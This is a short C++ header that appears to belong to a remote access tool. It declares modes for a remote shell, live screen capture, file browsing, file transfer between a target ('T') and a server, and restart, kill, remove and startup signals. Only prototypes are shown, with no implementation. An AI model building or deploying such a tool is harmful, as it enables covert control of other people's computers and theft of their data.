#pragma once
#include "json.hpp"
#include <map>

using namespace nlohmann;



/* 
   # ----------------------------------------------
   #  API MODES 
   # ----------------------------------------------
   # 1. mode shell for executable
   # 2. mode screen for screenshot live 
   # 3. mode explorer as explorer WIN protocol
   # 4. mode download download from T to server
   # 5. mode upload upload from server to T
   # S. <signals> restart,kill,rename,remove,startup
   # ....
   כל המצבים מתקשרים תחת חיבור חדש
   @[success]
*/


void bMode_shell(json setting_s, unsigned int port);


void bMode_shell_terminal(json setting_s, unsigned int port, const char* _app);


void bMode_screen(json setting_s, unsigned int port, map<string, int>& setting);


void bMode_screen_v2(json setting_s, unsigned int port, map<string, int>& setting);


void bMode_explorer(json setting_s, unsigned int port, map<string, int>& setting);


void bMode_download(json setting_s, unsigned int port);


void bMode_upload(json setting_s, unsigned int port);


void restart_tuna();

